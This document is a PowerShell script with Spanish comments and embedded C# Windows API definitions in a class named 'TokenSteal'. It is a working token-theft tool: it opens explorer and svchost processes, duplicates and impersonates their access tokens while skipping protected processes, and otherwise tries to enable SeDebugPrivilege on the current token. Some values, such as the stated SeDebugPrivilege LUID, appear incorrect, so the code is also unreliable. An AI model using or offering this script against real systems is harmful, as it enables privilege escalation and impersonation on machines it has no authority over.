Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
public class TokenSteal {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, out IntPtr TokenHandle);
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenThreadToken(IntPtr ThreadHandle, int DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentThread();
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}
[StructLayout(LayoutKind.Sequential)]
public struct TOKEN_PRIVILEGES {
    public uint PrivilegeCount;
    public LUID_AND_ATTRIBUTES Privileges;
}
[StructLayout(LayoutKind.Sequential)]
public struct LUID_AND_ATTRIBUTES {
    public LUID Luid;
    public uint Attributes;
}
[StructLayout(LayoutKind.Sequential)]
public struct LUID {
    public uint LowPart;
    public int HighPart;
}
"@

function Test-PPLProtection {
    param($Process)
    try {
        $mit = Get-ProcessMitigation -Name $Process.ProcessName -ErrorAction Stop
        return ($mit -match "ProtectedProcess")
    } catch {
        return $false  # Asume no PPL si no se puede chequear
    }
}

$found = $false
$targets = @("explorer", "svchost")  # Evitamos lsass/winlogon por PPL en Win11

foreach ($procName in $targets) {
    $procs = Get-Process -Name $procName -ErrorAction SilentlyContinue
    foreach ($p in $procs) {
        if (Test-PPLProtection $p) {
            Write-Host "[!] $($p.Name) (PID $($p.Id)) tiene PPL - Saltando para evitar bloqueo" -ForegroundColor Yellow
            continue
        }
        $hProcess = [TokenSteal]::OpenProcess(0x0010, $false, $p.Id)  # PROCESS_QUERY_INFORMATION
        if ($hProcess -ne [IntPtr]::Zero) {
            $hToken = [IntPtr]::Zero
            if ([TokenSteal]::OpenProcessToken($hProcess, 0x0008, [ref]$hToken)) {  # TOKEN_DUPLICATE
                $hDupToken = [IntPtr]::Zero
                if ([TokenSteal]::DuplicateToken($hToken, 2, [ref]$hDupToken)) {     # SecurityImpersonation
                    if ([TokenSteal]::ImpersonateLoggedOnUser($hDupToken)) {
                        Write-Host "[+] Token duplicado de $($p.Name) (PID $($p.Id)) - Usuario actual: $([Security.Principal.WindowsIdentity]::GetCurrent().Name)" -ForegroundColor Green
                        $found = $true
                        [TokenSteal]::CloseHandle($hDupToken)
                        break
                    }
                }
                [TokenSteal]::CloseHandle($hToken)
            }
            [TokenSteal]::CloseHandle($hProcess)
        }
    }
    if ($found) { break }
}

if (-not $found) {
    # Fallback: Intenta enable SeDebugPrivilege en token actual (común en Win11 users)
    Write-Host "[*] Intentando elevar privilegios locales..." -ForegroundColor Cyan
    $hThread = [TokenSteal]::GetCurrentThread()
    $hToken = [IntPtr]::Zero
    if ([TokenSteal]::OpenThreadToken($hThread, 0x0020, $true, [ref]$hToken)) {  # TOKEN_ADJUST_PRIVILEGES
        $tp = New-Object TOKEN_PRIVILEGES
        $tp.PrivilegeCount = 1
        $tp.Privileges.Luid.LowPart = 0x0020  # SeDebugPrivilege LUID
        $tp.Privileges.Attributes = 0x00000002  # SE_PRIVILEGE_ENABLED
        [TokenSteal]::AdjustTokenPrivileges($hToken, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero)
        Write-Host "[+] SeDebugPrivilege enabled en token actual (chequea con whoami /priv)" -ForegroundColor Green
        [TokenSteal]::CloseHandle($hToken)
    } else {
        Write-Host "[-] No se pudo acceder a tokens - PPL/Win11 bloqueando?" -ForegroundColor Red
    }
}
